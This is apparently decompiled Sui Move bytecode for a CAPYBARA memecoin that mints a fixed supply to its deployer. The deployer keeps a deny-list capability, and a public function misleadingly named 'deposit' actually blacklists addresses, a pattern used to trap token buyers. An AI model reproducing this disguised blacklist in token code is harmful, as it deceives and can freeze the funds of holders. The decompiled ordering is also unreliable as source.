module 0x9953587166882efcfd0cfb4338e8e8f9f0f346401ffbff9c872d9ff785200e79::capybara {
    struct CAPYBARA has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CAPYBARA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CAPYBARA>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: CAPYBARA, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/solana/7cWeM4kSGP2Mfm83k6F9BHukqeWccSYXq6bWFuu8THMN.png?size=lg&key=3437ae                                                                                                                                                                                                            ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<CAPYBARA>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"CAPYBARA")))), trim_right(b"#1 chill animal                 "), trim_right(b"Capybaras are the ultimate chill vibes in the animal kingdom, like nature's own version of a laid-back, oversized guinea pig that's too cool for any rodent drama                                                                                                                                                               "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CAPYBARA>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CAPYBARA>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<CAPYBARA>>(0x2::coin::mint<CAPYBARA>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CAPYBARA>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

